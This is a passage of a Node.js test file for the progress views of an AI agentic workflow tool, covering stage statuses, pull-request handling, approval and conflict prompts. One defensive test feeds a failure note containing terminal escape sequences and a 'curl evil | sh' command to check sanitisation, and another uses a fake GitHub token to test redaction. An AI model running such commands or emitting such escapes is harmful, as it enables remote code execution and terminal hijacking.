#!/usr/bin/env node
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const {
  PHASES,
  needsYou,
  deriveRoleGroupStatus,
  effectiveStatus,
  consistencyIssues,
  currentWork,
  percentComplete,
  buildSummary,
  commandFor,
  needsYouLines,
  recoveryCommands,
  planDigestLines,
  renderTerminal,
  renderMarkdown,
} = require('./progress');

function staleApprovedState() {
  return {
    status: 'active',
    phases: {
      request: { status: 'pass' },
      requirements: { status: 'pass' },
      'acceptance-criteria': { status: 'pass' },
      'definition-of-done': { status: 'pass' },
      inspection: { status: 'pass' },
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
      approval: { status: 'pass' },
    },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
        'qa-plan': { status: 'pass', executor: 'claude' },
      },
    },
  };
}

{
  const state = staleApprovedState();
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'plan'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Implementation');
  assert.ok(consistencyIssues(state).length >= 2);
  assert.strictEqual(percentComplete(state), Math.round((8 / PHASES.length) * 100), 'eight finished stages');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pending', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis');
  // Parallel roles: every running role is named, not just the first.
  state.roles.analysis.architect.status = 'in_progress';
  state.roles.analysis.security.status = 'in_progress';
  assert.strictEqual(currentWork(state), 'Specialist Analysis → architect, security');
  // A sibling that already failed does not turn a running stage red: the
  // stage stays in_progress, and the running role is still named.
  state.roles.analysis.architect.status = 'fail';
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis → security');
  // Once nothing runs any more, the failure shows.
  state.roles.analysis.security.status = 'pass';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'fail');
  state.roles.analysis.architect.status = 'blocked';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'blocked');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Request');
}

{
  const state = {
    status: 'active',
    phases: {
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
    },
    roles: {
      analysis: {
        security: { status: 'in_progress', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(currentWork(state), 'Implementation Plan');
  assert.ok(consistencyIssues(state).some(message => message.includes('Multiple stored phases')));
}

// The pull-request stage comes after final verification.
{
  const verified = () => ({ status: 'active', phases: Object.fromEntries(PHASES.filter(p => p !== 'pull-request').map(p => [p, { status: 'pass' }])), roles: {} });
  assert.strictEqual(PHASES[PHASES.length - 1], 'pull-request');

  // The stage is opt-in. With pull_request disabled (no config at all, or
  // enabled: false) a verified run that never reached it, or holds it as
  // pending, is complete: the stage reads as skipped, with the note and the
  // command that opens a PR by hand, and nothing says "stored: pending".
  const project = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-project-'));
  const previousProject = process.env.AI_WORKFLOW_PROJECT_ROOT;
  const previous = process.env.AI_AGENTIC_CLI;
  process.env.AI_WORKFLOW_PROJECT_ROOT = project;
  process.env.AI_AGENTIC_CLI = '1';
  const { disabledPullRequest, pullRequestSkipNote } = require('./progress');
  const config = text => { fs.mkdirSync(path.join(project, '.agentic'), { recursive: true }); fs.writeFileSync(path.join(project, '.agentic', 'config.yaml'), text); fs.utimesSync(path.join(project, '.agentic', 'config.yaml'), Date.now() / 1000, Date.now() / 1000 + Math.random()); };
  const stored = verified();
  stored.phases['pull-request'] = { status: 'pending' };
  for (const [state, what] of [[verified(), 'disabled, no phase'], [stored, 'disabled, stored pending']]) {
    assert.strictEqual(disabledPullRequest(state), true, what);
    assert.strictEqual(effectiveStatus(state, 'pull-request'), 'skipped', what);
    assert.strictEqual(percentComplete(state), 100, what);
    assert.strictEqual(currentWork(state), 'Done', what);
    assert.strictEqual(needsYou('FEAT-1', state, { root: os.tmpdir() }), null, what);
    const derived = buildSummary('FEAT-1', state);
    assert.strictEqual(derived.pullRequestHint, 'agentic pr FEAT-1', what);
    const stage = derived.phases.find(p => p.id === 'pull-request');
    assert.strictEqual(stage.rawStatus, undefined, `${what}: a status the view derived has no stored marker`);
    assert.strictEqual(stage.note, 'pull_request disabled (open one with: agentic pr FEAT-1)', what);
    assert.ok(!/stored: pending/.test(renderTerminal(derived)), what);
    assert.match(renderTerminal(derived), /Pull request: not opened — run: agentic pr FEAT-1/, what);
  }
  assert.strictEqual(pullRequestSkipNote('FEAT-1', false), 'pull_request disabled (open one with: node ai/workflow/engine.js pr FEAT-1)');
  // Verification not passed yet: the stage is still to come, percent unchanged.
  const unverified = verified();
  unverified.phases.verification = { status: 'in_progress' };
  assert.strictEqual(disabledPullRequest(unverified), false);
  assert.strictEqual(effectiveStatus(unverified, 'pull-request'), 'pending');
  assert.strictEqual(currentWork(unverified), 'Final Verification');
  // Enabled in the project config: the stage has work to do and waits.
  config('pull_request:\n  enabled: true\n');
  const waiting = verified();
  assert.strictEqual(disabledPullRequest(waiting), false, 'enabled: the stage runs');
  assert.strictEqual(currentWork(waiting), 'Waiting for Pull Request');
  assert.strictEqual(percentComplete(waiting), Math.round(((PHASES.length - 1) / PHASES.length) * 100));
  assert.strictEqual(buildSummary('FEAT-1', waiting).pullRequestHint, null, 'no hint while the stage is still to run');
  assert.strictEqual(buildSummary('FEAT-1', waiting).phases.find(p => p.id === 'pull-request').note, null);
  // `agentic pr` (a manual request) keeps the stage runnable while disabled.
  fs.rmSync(path.join(project, '.agentic'), { recursive: true, force: true });
  const requested = verified();
  requested.pullRequestOptions = { manual: true };
  assert.strictEqual(disabledPullRequest(requested), false, 'a requested PR is pending, not skipped');
  assert.strictEqual(currentWork(requested), 'Waiting for Pull Request');
  requested.pullRequestOptions = {};
  config('pull_request:\n  enabled: false\n');
  assert.strictEqual(currentWork(requested), 'Done', 'the config is read again when the file changes');
  config('pull_request:\n  enabled: true\n');
  assert.strictEqual(currentWork(requested), 'Waiting for Pull Request');
  // A block that does not parse is not a disabled one: the stage waits, and the
  // summary's warnings say what is wrong with the file (the engine records the
  // same problems when it skips).
  for (const text of ['pull_request:\n  enabled: "yes"\n', 'pull_request:\n  enabled: true\nother: [unclosed\n']) {
    config(text);
    const broken = verified();
    assert.strictEqual(disabledPullRequest(broken), false, text);
    assert.deepStrictEqual([currentWork(broken), effectiveStatus(broken, 'pull-request')], ['Waiting for Pull Request', 'pending'], text);
    const brokenSummary = buildSummary('FEAT-1', broken);
    assert.ok(brokenSummary.warnings.some(w => /^\.agentic\/config\.yaml(: pull_request\.enabled must be true or false| is not valid YAML)/.test(w)), JSON.stringify(brokenSummary.warnings));
    assert.strictEqual(brokenSummary.phases.find(p => p.id === 'pull-request').note, null, text);
    assert.match(renderTerminal(brokenSummary), /State reconciliation:\n {3}- \.agentic\/config\.yaml/, text);
  }
  // Closing a run whose skip was derived, never written: the stored pending
  // phase still reads as skipped after the close, whatever the config says.
  for (const text of ['pull_request:\n  enabled: true\n', 'pull_request:\n  enabled: false\n']) {
    config(text);
    const closed = verified();
    closed.status = 'done';
    closed.phases['pull-request'] = { status: 'pending' };
    assert.deepStrictEqual([effectiveStatus(closed, 'pull-request'), percentComplete(closed), currentWork(closed)], ['skipped', 100, 'Done'], `closed, stored pending, ${text}`);
    const closedSummary = buildSummary('FEAT-1', closed);
    assert.deepStrictEqual([closedSummary.phases.find(p => p.id === 'pull-request').rawStatus, closedSummary.warnings], [undefined, []], text);
    assert.ok(!/stored: pending|Waiting for Pull Request/.test(renderTerminal(closedSummary)), text);
  }
  fs.rmSync(project, { recursive: true, force: true });
  assert.strictEqual(currentWork(requested), 'Done', 'no config: disabled');
  if (previousProject === undefined) delete process.env.AI_WORKFLOW_PROJECT_ROOT; else process.env.AI_WORKFLOW_PROJECT_ROOT = previousProject;

  // Skipped (opt-in disabled, recorded by the engine): complete, with the command that opens it.
  const skipped = verified();
  skipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.strictEqual(percentComplete(skipped), 100);
  assert.strictEqual(currentWork(skipped), 'Done');
  const skippedSummary = buildSummary('FEAT-1', skipped);
  assert.strictEqual(skippedSummary.pullRequestHint, 'agentic pr FEAT-1');
  assert.match(renderTerminal(skippedSummary), /Pull request: not opened — run: agentic pr FEAT-1/);
  assert.match(renderMarkdown(skippedSummary), /\*\*Pull request:\*\* not opened — run `agentic pr FEAT-1`/);
  if (previous === undefined) delete process.env.AI_AGENTIC_CLI; else process.env.AI_AGENTIC_CLI = previous;

  // Blocked: named as the current stop.
  const blocked = verified();
  blocked.phases['pull-request'] = { status: 'blocked', note: 'missing credentials' };
  assert.strictEqual(currentWork(blocked), 'Pull Request (blocked)');

  // Opened: the number and URL near the top, whitelisted fields only.
  const opened = verified();
  opened.phases['pull-request'] = { status: 'pass' };
  opened.pullRequest = { provider: 'bitbucket', number: 7762, url: 'https://bitbucket.org/ws/app/pull-requests/7762', status: 'open', branch: 'ai/FEAT-1', base: 'master', draft: false, commit: 'abc', preCommitSha: 'def', reason: 'internal' };
  const summary = buildSummary('FEAT-1', opened);
  assert.deepStrictEqual(Object.keys(summary.pullRequest).sort(), ['base', 'branch', 'draft', 'number', 'provider', 'status', 'url']);
  const terminal = renderTerminal(summary).split('\n');
  const prRow = terminal.findIndex(line => line.includes('Pull request: #7762 https://bitbucket.org/ws/app/pull-requests/7762'));
  assert.ok(prRow > 0 && prRow < terminal.findIndex(line => line.includes('Request ')), 'the PR line sits above the stage list');
  assert.match(renderMarkdown(summary), /\*\*Pull request:\*\* \[#7762\]\(https:\/\/bitbucket\.org\/ws\/app\/pull-requests\/7762\)/);

  // A run closed before the stage existed is finished, not stuck at 93%.
  const closed = verified();
  closed.status = 'done';
  assert.strictEqual(effectiveStatus(closed, 'pull-request'), 'skipped');
  assert.strictEqual(percentComplete(closed), 100);
  // It shows no "agentic pr" hint (its PR may have been opened by hand), and no
  // "(stored: pending)" next to a status the view derived itself.
  const closedSummary = buildSummary('FEAT-OLD', closed);
  assert.strictEqual(closedSummary.pullRequestHint, null, 'no hint for a run closed before the stage existed');
  assert.strictEqual(closedSummary.phases.find(p => p.id === 'pull-request').rawStatus, undefined);
  assert.ok(!/stored: pending/.test(renderTerminal(closedSummary)), renderTerminal(closedSummary));
  assert.ok(!/Pull request: not opened/.test(renderTerminal(closedSummary)));

  // An abandoned run never reached the stage: it is not counted as done.
  const abandoned = { status: 'done', abandoned: true, roles: {}, phases: Object.fromEntries(PHASES.slice(0, 6).map(p => [p, { status: 'pass' }])) };
  const before = { ...abandoned, status: 'active', abandoned: undefined };
  assert.strictEqual(effectiveStatus(abandoned, 'pull-request'), 'pending');
  assert.strictEqual(percentComplete(abandoned), Math.round((6 / (PHASES.length - 1)) * 100), 'the stage it never reached is left out of the percent');
  assert.ok(percentComplete(abandoned) < 100 && percentComplete(abandoned) >= percentComplete(before));
  assert.strictEqual(buildSummary('FEAT-GAVEUP', abandoned).pullRequestHint, null);
  // A closed run that has the stage gets the hint with --reopen.
  const closedSkipped = verified();
  closedSkipped.status = 'done';
  closedSkipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.match(buildSummary('FEAT-2', closedSkipped).pullRequestHint, / pr FEAT-2 --reopen$/);
}

// Build + Tests again after fixes, before verification.
{
  const { labelOf } = require('./progress');
  assert.strictEqual(PHASES.indexOf('post-fix-build-test'), PHASES.indexOf('fixes') + 1);
  assert.ok(PHASES.indexOf('post-fix-build-test') < PHASES.indexOf('verification'));
  assert.strictEqual(labelOf('post-fix-build-test'), 'Post-fix Build + Tests');
  // Every label fits the 24-column status table of `agentic progress`.
  for (const p of PHASES) assert.ok(labelOf(p).length <= 24, `${p}: ${labelOf(p)}`);
  const upToFixes = Object.fromEntries(PHASES.slice(0, PHASES.indexOf('post-fix-build-test')).map(p => [p, { status: 'pass' }]));
  const red = { status: 'active', roles: {}, phases: { ...upToFixes, 'post-fix-build-test': { status: 'fail', note: 'flutter test: 1 failing', updatedAt: 't' } } };
  const attention = needsYou('FEAT-1', red, { root: os.tmpdir(), cli: true });
  assert.deepStrictEqual([attention.stage, attention.headline, attention.command], ['post-fix-build-test', 'Post-fix Build + Tests failed', 'agentic retry FEAT-1']);
  assert.strictEqual(currentWork(red), 'Post-fix Build + Tests (fail)');
  red.phases['post-fix-build-test'] = { status: 'in_progress' };
  assert.strictEqual(currentWork(red), 'Post-fix Build + Tests');
  // A run verified and closed before the stage existed is still 100%, with no stored-status note.
  const legacy = { status: 'done', roles: {}, phases: Object.fromEntries(PHASES.filter(p => p !== 'post-fix-build-test').map(p => [p, { status: 'pass' }])) };
  assert.strictEqual(effectiveStatus(legacy, 'post-fix-build-test'), 'skipped');
  assert.strictEqual(percentComplete(legacy), 100);
  assert.strictEqual(buildSummary('FEAT-OLD', legacy).phases.find(p => p.id === 'post-fix-build-test').rawStatus, undefined);
}

// Needs you: what the run waits on a human for, with the reason and the command.
{
  const passed = upTo => Object.fromEntries(PHASES.slice(0, PHASES.indexOf(upTo)).map(p => [p, { status: 'pass' }]));
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-needs-'));
  try {
    assert.strictEqual(needsYou('FEAT-1', { status: 'active', phases: passed('analysis'), roles: {} }, { root }), null, 'nothing waits on a human mid-run');
    assert.strictEqual(needsYou('FEAT-1', { status: 'done', phases: { 'build-test': { status: 'fail', note: 'x' } } }, { root }), null, 'a closed run needs nobody');

    // A failed stage: its reason, and the retry command as this install spells it.
    const failed = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: '2026-11-04T10:00:00.000Z', note: 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart' } } };
    const attention = needsYou('FEAT-1', failed, { root, cli: true });
    assert.deepStrictEqual(
      [attention.kind, attention.stage, attention.headline, attention.reason, attention.command, attention.repeated, attention.key],
      ['fail', 'build-test', 'Build + Tests failed', 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart', 'agentic retry FEAT-1', 0, 'FEAT-1|build-test|fail|2026-11-04T10:00:00.000Z']);
    assert.strictEqual(needsYou('FEAT-1', failed, { root, cli: false }).command, 'node ai/tasks/feature/runs.js retry FEAT-1 && node ai/workflow/engine.js resume FEAT-1');
    // The same failure again: the stage cannot fix it.
    failed.phases['build-test'].repeatedFailure = 3;
    const repeated = needsYou('FEAT-1', failed, { root, cli: true });
    assert.strictEqual(repeated.headline, 'Same failure as last time — this needs a fix outside Build + Tests');
    assert.strictEqual(repeated.repeated, 3);
    const summary = buildSummary('FEAT-1', failed, { root });
    assert.deepStrictEqual(summary.needsYou, needsYou('FEAT-1', failed, { root }));
    const terminal = renderTerminal(summary);
    assert.match(terminal, /⚠ Needs you: Same failure as last time — this needs a fix outside Build \+ Tests\n {3}build-test\/qa-execute: 3 widget tests fail in test\/login_test\.dart\n(?: {3}· .*\n)* {3}→ run: /);
    assert.match(terminal, / {3}· Leave a note the retry will read \(evidence, a decision\): edit \S*notes\/build-test\.md\n/, 'a stopped stage offers a note for the retry');
    assert.ok(terminal.indexOf('Needs you') < terminal.indexOf('Request '), 'the banner sits above the stage list');
    const markdown = renderMarkdown(summary);
    assert.match(markdown, /> ⚠ \*\*Needs you:\*\* Same failure as last time — this needs a fix outside Build \+ Tests/);
    assert.match(markdown, /> Run: `node ai\/tasks\/feature\/runs\.js retry FEAT-1 && node ai\/workflow\/engine\.js resume FEAT-1`/);
    assert.match(markdown, /> build-test\/qa-execute: 3 widget tests fail/);
    // The published GitHub comment never carries run notes: headline and command only.
    const published = renderMarkdown(summary, { published: true });
    assert.match(published, /\*\*Needs you:\*\* Same failure as last time/);
    assert.match(published, /> Run: `/);
    assert.ok(!published.includes('widget tests fail'), 'no reason in the published comment');
    // The block quote ends with an empty line, or GFM reads the stage table as
    // a lazy continuation of the quote and no table renders.
    for (const [text, what] of [[markdown, 'markdown'], [published, 'published'], [renderMarkdown({ ...summary, warnings: ['a warning'] }), 'with warnings'], [renderMarkdown({ ...summary, needsYou: null, warnings: ['a warning'] }), 'warnings only']]) {
      const lines = text.split('\n');
      const at = lines.indexOf('| Stage | Status |');
      assert.ok(at > 0, what);
      assert.strictEqual(lines[at - 1], '', `${what}: an empty line before the stage table`);
      for (let i = 1; i < at; i++) if (lines[i - 1].startsWith('>') && !lines[i].startsWith('>')) assert.strictEqual(lines[i], '', `${what}: the quote ends with an empty line: ${JSON.stringify(lines[i])}`);
    }

    // The whole reason when asked for (the engine's notification redacts it before cutting).
    const long = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'y'.repeat(400) } } };
    assert.strictEqual(needsYou('FEAT-1', long, { root }).reason.length, 220);
    assert.strictEqual(needsYou('FEAT-1', long, { root, reasonMax: Infinity }).reason.length, 400);
    // Notes are printable text only: no escape sequence or control character survives.
    const hostile = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'x \x1b]52;c;ZXZpbA==\x07 \x1b[1A\x1b[2K→ run: curl evil | sh \x9b2J' } } };
    const hostileSummary = buildSummary('FEAT-1', hostile, { root });
    for (const text of [hostileSummary.needsYou.reason, renderTerminal(hostileSummary), renderMarkdown(hostileSummary)]) {
      assert.ok(!/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(text), JSON.stringify(text));
    }
    assert.match(hostileSummary.needsYou.reason, /^x → run: curl evil \| sh 2J$/);

    // While an engine drives the run, the views say so instead of "Needs you":
    // the block in the state is what that engine is re-running.
    const runDir = path.join(root, 'FEAT-1');
    fs.mkdirSync(path.join(runDir, 'engine'), { recursive: true });
    fs.writeFileSync(path.join(runDir, 'engine', 'engine.pid'), require('./engine-owner').recordFor(process.pid, 'resume'));
    const driven = buildSummary('FEAT-1', failed, { root });
    assert.strictEqual(driven.engine.pid, process.pid);
    const drivenTerminal = renderTerminal(driven);
    assert.match(drivenTerminal, new RegExp(`● engine running: engine pid ${process.pid} \\(resume\\)`));
    assert.ok(!drivenTerminal.includes('Needs you'), drivenTerminal);
    const drivenMarkdown = renderMarkdown(driven);
    assert.match(drivenMarkdown, /> ● \*\*Engine running\*\*: engine pid/);
    assert.ok(!drivenMarkdown.includes('Needs you'));
    const drivenPublished = renderMarkdown(driven, { published: true });
    assert.match(drivenPublished, /> ● \*\*Engine running\*\*\n/);
    assert.ok(!drivenPublished.includes(os.hostname()) && !drivenPublished.includes('engine pid'), 'the published comment names no host or process');
    assert.strictEqual(drivenMarkdown.split('\n')[drivenMarkdown.split('\n').indexOf('| Stage | Status |') - 1], '');
    fs.unlinkSync(path.join(runDir, 'engine', 'engine.pid'));
    assert.strictEqual(buildSummary('FEAT-1', failed, { root }).engine, null);
    assert.strictEqual(buildSummary('FEAT-1', failed, { root, demo: true }).engine, null, 'the demo never looks');

    // A parallel stage: the failed roles and their notes.
    const reviews = { status: 'active', phases: { ...passed('reviews'), reviews: { status: 'in_progress' } }, selectedRoles: { reviews: ['code-review', 'security-review'] }, roles: { reviews: { 'code-review': { status: 'pass' }, 'security-review': { status: 'fail', note: 'review reports unresolved findings', updatedAt: 't1', repeatedFailure: 2 } } } };
    const review = needsYou('FEAT-2', reviews, { root, cli: true });
    assert.deepStrictEqual([review.stage, review.reason, review.repeated, review.key], ['reviews', 'security-review: review reports unresolved findings', 2, 'FEAT-2|reviews|fail|t1']);

    // A blocked conditional role: its stage still reads pending.
    const conditional = { status: 'active', roles: {}, phases: passed('verification'), conditionals: { verification: { 'mobile-evidence': { status: 'blocked', reason: 'no booted Android emulator', updatedAt: 't2' } } } };
    const evidence = needsYou('FEAT-3', conditional, { root, cli: true });
    assert.deepStrictEqual([evidence.kind, evidence.stage, evidence.role, evidence.headline, evidence.reason, evidence.command], ['blocked', 'verification', 'mobile-evidence', 'Final Verification (mobile-evidence) blocked', 'mobile-evidence: no booted Android emulator', 'agentic retry FEAT-3']);
    conditional.phases.verification = { status: 'pass' };
    assert.notStrictEqual(needsYou('FEAT-3', conditional, { root })?.stage, 'verification', 'a stage that passed since is not waiting on its old conditional');

    // Verified with no pull request recorded (a run verified before the stage
    // existed, or one whose PR was opened by hand) while pull_request is enabled:
    // it says how to open or record it. With the block disabled (the default)
    // the stage reads as skipped and the run as complete, so nothing waits.
    const prProject = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-pr-project-'));
    const previousProjectRoot = process.env.AI_WORKFLOW_PROJECT_ROOT;
    process.env.AI_WORKFLOW_PROJECT_ROOT = prProject;
    fs.mkdirSync(path.join(prProject, '.agentic'), { recursive: true });
    fs.writeFileSync(path.join(prProject, '.agentic', 'config.yaml'), 'pull_request:\n  enabled: true\n');
    try {
      const pending = needsYou('FEAT-3', conditional, { root, cli: true });
      assert.deepStrictEqual([pending.kind, pending.stage, pending.headline, pending.command], ['waiting', 'pull-request', 'Verified — no pull request recorded yet', 'agentic pr FEAT-3']);
      assert.deepStrictEqual(recoveryCommands('FEAT-3', pending, { root, state: conditional, cli: true }).items.map(item => item.label), ['pr', 'status', 'doctor'], 'the block names the pull request command');
      assert.strictEqual(needsYou('FEAT-3', { ...conditional, pullRequest: { url: 'https://example.test/pr/1' } }, { root }), null, 'a recorded pull request is not asked for again');
      assert.strictEqual(needsYou('FEAT-3', { ...conditional, status: 'done' }, { root }), null, 'a closed run asks for nothing');
    } finally {
      if (previousProjectRoot === undefined) delete process.env.AI_WORKFLOW_PROJECT_ROOT; else process.env.AI_WORKFLOW_PROJECT_ROOT = previousProjectRoot;
      fs.rmSync(prProject, { recursive: true, force: true });
    }
    assert.strictEqual(needsYou('FEAT-3', conditional, { root, cli: true }), null, 'with pull_request disabled the verified run is complete, not waiting');
    assert.strictEqual(effectiveStatus(conditional, 'pull-request'), 'skipped');

    // A blocked pull request resumes; the furthest stop wins.
    const pr = { status: 'active', roles: {}, phases: { ...passed('pull-request'), 'pull-request': { status: 'blocked', note: 'BITBUCKET_API_TOKEN is not set' }, requirements: { status: 'fail', note: 'stale' } } };
    assert.deepStrictEqual([needsYou('FEAT-4', pr, { root, cli: true }).stage, needsYou('FEAT-4', pr, { root, cli: true }).command], ['pull-request', 'agentic resume FEAT-4']);

    // Human gates: approval (never a key, always the command) and conflicts.
    const gate = { status: 'active', roles: {}, phases: { ...passed('approval'), plan: { status: 'pass', updatedAt: 'p1' } } };
    fs.mkdirSync(path.join(root, 'FEAT-5'), { recursive: true });
    // No plan file at all: the three lines of before.
    assert.strictEqual(needsYou('FEAT-5', gate, { root, cli: true }).plan, null);
    assert.strictEqual(needsYouLines(needsYou('FEAT-5', gate, { root, cli: true })).length, 3);
    // The plan digest: counts, the head of the summary (redacted, printable,
    // bounded), the file; never the steps, criteria or risks themselves.
    const planJson = path.join(root, 'FEAT-5', '06-plan.json');
    const summaryText = `ghp_${'A'.repeat(20)} \x1b[2J first line of the summary\n> **REVIEW AMENDMENTS (binding)** apply CONFLICT-001\n\n${Array.from({ length: 8 }, (_, i) => `${'s'.repeat(130)} line ${i + 3} of the plan summary`).join('\n')}`;
    fs.writeFileSync(planJson, JSON.stringify({ schemaVersion: 1, runId: 'FEAT-5', summary: summaryText, steps: Array.from({ length: 9 }, (_, i) => ({ id: `S${i}`, description: `step ${i} secret-step-text` })), acceptanceCriteria: Array.from({ length: 23 }, (_, i) => `AC-${i}`), risks: Array.from({ length: 11 }, (_, i) => `risk ${i}`) }));
    fs.writeFileSync(path.join(root, 'FEAT-5', '06-plan.md'), `# Implementation plan\n\n${summaryText}\n\n## Steps\n\n1. a step\n`);
    const approval = needsYou('FEAT-5', gate, { root, cli: true });
    assert.deepStrictEqual([approval.kind, approval.stage, approval.headline, approval.command, approval.key], ['waiting', 'approval', 'The plan waits for your approval', 'agentic approve FEAT-5', 'FEAT-5|approval|waiting|p1']);
    assert.deepStrictEqual([approval.plan.steps, approval.plan.acceptanceCriteria, approval.plan.risks, approval.plan.amendments], [9, 23, 11, true]);
    assert.ok(approval.plan.summary.length <= 6 && approval.plan.summary.join('').length <= 600, JSON.stringify(approval.plan.summary));
    assert.ok(approval.plan.summary.at(-1).endsWith('…'), 'the line that crosses the budget is cut');
    const digestText = approval.plan.summary.join('\n');
    assert.ok(digestText.includes('***') && !digestText.includes('ghp_') && !digestText.includes('\x1b'), digestText);
    assert.ok(!digestText.includes('secret-step-text') && !digestText.includes('AC-0'), 'no step or criterion text');
    assert.strictEqual(approval.plan.path, require('./paths').relativeStatePath('FEAT-5', '06-plan.md'));
    assert.strictEqual(needsYou('FEAT-5', gate, { root, cli: false }).plan.path, 'ai/runs/FEAT-5/06-plan.md');
    assert.ok(path.isAbsolute(approval.plan.file) && approval.plan.file.endsWith('06-plan.md'));
    const approvalLines = needsYouLines(approval);
    assert.strictEqual(approvalLines[0], '⚠ Needs you: The plan waits for your approval');
    assert.strictEqual(approvalLines[1], `  ${approval.reason}`);
    assert.strictEqual(approvalLines[2], '  Plan: 9 steps · 23 acceptance criteria · 11 risks · REVIEW AMENDMENTS present');
    assert.ok(approvalLines.slice(3, -2).every(line => line.startsWith('    │ ')), approvalLines);
    assert.match(approvalLines.at(-2), /^ {4}Full plan: /);
    assert.strictEqual(approvalLines.at(-1), '  → run: agentic approve FEAT-5');
    const gateSummary = buildSummary('FEAT-5', gate, { root });
    assert.match(renderTerminal(gateSummary), /\n {3}Plan: 9 steps · 23 acceptance criteria · 11 risks/);
    assert.match(renderMarkdown(gateSummary), /> Plan: 9 steps · 23 acceptance criteria · 11 risks · REVIEW AMENDMENTS present {2}\n> Run: /);
    assert.ok(!renderMarkdown(gateSummary).includes('│'), 'the Markdown view carries the counts line only');
    assert.ok(!renderMarkdown(gateSummary, { published: true }).includes('Plan:'), 'the published comment never carries the plan');
    // No JSON: counts unavailable, the summary comes from the Markdown body.
    fs.unlinkSync(planJson);
    const fromMd = needsYou('FEAT-5', gate, { root, cli: true }).plan;
    assert.deepStrictEqual([fromMd.steps, fromMd.acceptanceCriteria, fromMd.risks, fromMd.amendments], [null, null, null, true]);
    assert.match(planDigestLines(fromMd)[0], /^Plan: counts unavailable/);
    assert.ok(!fromMd.summary[0].includes('Implementation plan') && fromMd.summary[0].includes('***'), JSON.stringify(fromMd.summary));
    fs.writeFileSync(path.join(root, 'FEAT-5', 'plan.approved'), 'approved\n');
    assert.strictEqual(needsYou('FEAT-5', gate, { root }), null, 'approved: nothing waits');
    // Open specialist conflicts: the count, ids and topics, and the exact
    // resolve and resume commands. The key names each finding pair.
    const conflicts = { status: 'active', roles: {}, phases: passed('plan') };
    const conflictsFile = path.join(root, 'FEAT-6', '05-analysis', 'conflicts.json');
    const writeConflicts = list => { fs.mkdirSync(path.dirname(conflictsFile), { recursive: true }); fs.writeFileSync(conflictsFile, JSON.stringify({ conflicts: list })); };
    const six = [{ id: 'CONFLICT-002', topic: 'payments, retries', findings: ['D', 'C'], status: 'unresolved' }, { id: 'CONFLICT-001', topic: 'storage', findings: ['B', 'A'], status: 'unresolved' }, { id: 'CONFLICT-003', status: 'resolved' }];
    writeConflicts(six);
    const disputed = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.deepStrictEqual([disputed.kind, disputed.stage, disputed.headline, disputed.command, disputed.key], ['waiting', 'plan', '2 conflicts need your decision', 'agentic conflicts FEAT-6', 'FEAT-6|plan|waiting|CONFLICT-001=A+B,CONFLICT-002=C+D']);
    assert.deepStrictEqual(disputed.conflicts, ['CONFLICT-001', 'CONFLICT-002']);
    assert.strictEqual(disputed.reason, 'CONFLICT-001 (storage), CONFLICT-002 (payments, retries). Decide each with: agentic resolve FEAT-6 <conflict-id> --decision "..." --rationale "...", then: agentic resume FEAT-6');
    const disputedNode = needsYou('FEAT-6', conflicts, { root, cli: false });
    assert.strictEqual(disputedNode.command, 'node ai/workflow/conflicts.js list FEAT-6');
    assert.match(disputedNode.reason, /node ai\/workflow\/conflicts\.js resolve FEAT-6 <conflict-id>/);
    assert.match(disputedNode.reason, /then: node ai\/workflow\/engine\.js resume FEAT-6$/);
    assert.strictEqual(needsYou('FEAT-6', conflicts, { root, cli: true }).key, disputed.key, 'a refresh keeps the key: no repeat notification');
    // CURRENT and the terminal banner say a decision waits, not "Waiting for Implementation Plan".
    const previousCli = process.env.AI_AGENTIC_CLI;
    process.env.AI_AGENTIC_CLI = '1';
    try {
      const disputedSummary = buildSummary('FEAT-6', conflicts, { root });
      assert.strictEqual(disputedSummary.current, 'Waiting for conflict decisions');
      assert.strictEqual('Waiting for conflict decisions'.length, 30, 'fits the CURRENT column of agentic runs');
      const disputedTerminal = renderTerminal(disputedSummary);
      assert.ok(disputedTerminal.includes('⚠ Needs you: 2 conflicts need your decision'), disputedTerminal);
